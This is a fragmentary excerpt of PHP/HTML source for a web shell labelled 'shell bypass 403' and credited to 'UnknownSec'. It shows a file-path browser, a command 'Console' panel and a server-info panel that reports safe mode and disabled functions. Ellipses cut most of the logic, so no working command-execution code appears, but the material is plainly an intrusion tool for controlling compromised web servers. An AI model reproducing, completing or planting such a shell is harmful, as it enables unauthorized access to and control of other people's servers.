...
$_n = 'UnknownSec';
$_s = "<style>table{display:none;}</style><div class='bkp'><hr></div>";
	...
	<div class='py-3' id='main'>
		<div class='box shadow bg-dark p-4 rounded-3'>
			<div class='corner text-secondary'>shell bypass 403</div>
				...
				if($pat == '' && $id == 0){
					$a = true;
					echo '<div class="bkp"><i class="bi bi-hdd-rack"></i> : <a class="text-decoration-none text-light" href="?path=/">/</a>';
				continue;
				}
				if($pat == '') continue;
...
<div class='card text-dark'>
	...
	<kbd>$_x&nbsp;Console</kbd>
		...
		echo '<strong>Disable function</strong> <div class="bkp">'.ini_get("disable_functions").'!</div> '.er().'</div>';
		endif;
	echo '
	</div>
</div>
...
<div class='card text-dark'>
	...
	<kbd>$_x&nbsp;Info server</kbd>
		...
		Safe Mode: $sm<br />
		<kbd>Disable Function:</kbd><div class='bkp'>$disfc</div>
	</div>
</div>
<br>";
